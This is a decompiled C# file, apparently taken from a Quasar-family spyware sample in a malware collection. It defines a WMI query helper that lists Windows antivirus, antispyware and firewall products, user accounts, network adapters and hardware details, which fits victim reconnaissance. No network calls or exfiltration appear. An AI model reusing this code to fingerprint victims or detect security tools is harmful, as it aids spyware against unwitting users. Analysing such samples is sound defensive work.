// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.WMI.WmiInstance
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System.Collections.Generic;
using System.Management;

namespace NoiseMe.Drags.App.Data.WMI
{
  public static class WmiInstance
  {
    public const string OPERATINGSYSTEM_CLASSNAME = "Win32_OperatingSystem";
    public const string USERACCOUNT_CLASSNAME = "Win32_UserAccount";
    public const string ANTIVIRUS_CLASSNAME = "AntivirusProduct";
    public const string ANTISPYWARE_CLASSNAME = "AntiSpyWareProduct";
    public const string FIREWALL_CLASSNAME = "FirewallProduct";
    public const string NETWORKADAPTER_CLASSNAME = "Win32_NetworkAdapterConfiguration";
    public const string BASEBOARD_CLASSNAME = "Win32_Baseboard";
    public const string PHYSICALMEMORY_CLASSNAME = "Win32_PhysicalMemory";
    public const string PROCESSOR_CLASSNAME = "Win32_Processor";
    public const string VIDEOCONTROLLER_CLASSNAME = "Win32_VideoController";
    public const string DISKDRIVE_CLASSNAME = "Win32_DiskDrive";
    public const string BIOS_CLASSNAME = "Win32_BIOS";

    private static ManagementObjectCollection GetObjectCollection(
      ObjectQuery query,
      ManagementScope scope)
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, query))
        return managementObjectSearcher.Get();
    }

    private static ManagementObjectCollection GetObjectCollection(
      string query,
      ManagementScope scope)
    {
      return WmiInstance.GetObjectCollection(new ObjectQuery(query), scope);
    }

    private static ManagementObjectCollection GetObjectCollection(
      string wmiclass,
      string[] properties,
      string condition,
      ManagementScope scope)
    {
      string str = properties == null ? "*" : string.Join(",", properties);
      string query;
      if (!string.IsNullOrEmpty(condition))
        query = "SELECT " + str + " FROM " + wmiclass + " WHERE " + condition;
      else
        query = "SELECT " + str + " FROM " + wmiclass;
      ManagementScope scope1 = scope;
      return WmiInstance.GetObjectCollection(query, scope1);
    }

    private static ManagementObjectCollection GetObjectCollection(
      string wmiclass,
      string property,
      string condition,
      ManagementScope scope)
    {
      return WmiInstance.GetObjectCollection(wmiclass, new string[1]
      {
        property
      }, condition, scope);
    }

    private static WmiInstanceClassCollection ParseObjectCollection(
      ManagementObjectCollection objectCollection)
    {
      List<WmiInstanceClass> collection = new List<WmiInstanceClass>();
      try
      {
        foreach (ManagementObject managementObject in objectCollection)
        {
          List<WmiInstanceProperty> properties = new List<WmiInstanceProperty>();
          foreach (PropertyData property in managementObject.Properties)
            properties.Add(new WmiInstanceProperty(property.Name, property.Value));
          collection.Add(new WmiInstanceClass((ICollection<WmiInstanceProperty>) properties));
        }
      }
      catch (ManagementException ex)
      {
        return (WmiInstanceClassCollection) null;
      }
      objectCollection?.Dispose();
      return new WmiInstanceClassCollection((ICollection<WmiInstanceClass>) collection);
    }

    public static WmiInstanceClassCollection Query(
      string wmiclass,
      string[] properties,
      string condition,
      ManagementScope scope = null)
    {
      return WmiInstance.ParseObjectCollection(WmiInstance.GetObjectCollection(wmiclass, properties, condition, scope));
    }

    public static WmiInstanceClassCollection Query(
      string wmiclass,
      string[] properties,
      ManagementScope scope = null)
    {
      return WmiInstance.Query(wmiclass, properties, (string) null, scope);
    }

    public static WmiInstanceClassCollection Query(
      string wmiclass,
      ManagementScope scope = null)
    {
      return WmiInstance.Query(wmiclass, (string[]) null, scope);
    }

    public static WmiInstanceClassCollection CustomQuery(
      ObjectQuery query,
      ManagementScope scope = null)
    {
      return WmiInstance.ParseObjectCollection(WmiInstance.GetObjectCollection(query, scope));
    }

    public static WmiInstanceClassCollection CustomQuery(
      string query,
      ManagementScope scope = null)
    {
      return WmiInstance.CustomQuery(new ObjectQuery(query), scope);
    }

    public static WmiInstanceProperty PropertyQuery(
      string wmiclass,
      string property,
      string condition,
      ManagementScope scope = null)
    {
      foreach (WmiInstanceClass wmiInstanceClass in WmiInstance.ParseObjectCollection(WmiInstance.GetObjectCollection(wmiclass, property, condition, scope)))
      {
        WmiInstanceProperty[] properties = wmiInstanceClass.Properties;
        int index = 0;
        if (index < properties.Length)
          return properties[index];
      }
      return (WmiInstanceProperty) null;
    }

    public static WmiInstanceProperty PropertyQuery(
      string wmiclass,
      string property,
      ManagementScope scope = null)
    {
      return WmiInstance.PropertyQuery(wmiclass, property, (string) null, scope);
    }

    public static T PropertyQuery<T>(
      string wmiclass,
      string property,
      string condition,
      ManagementScope scope = null)
    {
      WmiInstanceProperty instanceProperty = WmiInstance.PropertyQuery(wmiclass, property, condition, scope);
      return instanceProperty.Value != null ? (T) instanceProperty.Value : default (T);
    }

    public static T PropertyQuery<T>(string wmiclass, string property, ManagementScope scope = null) => WmiInstance.PropertyQuery<T>(wmiclass, property, (string) null, scope);
  }
}
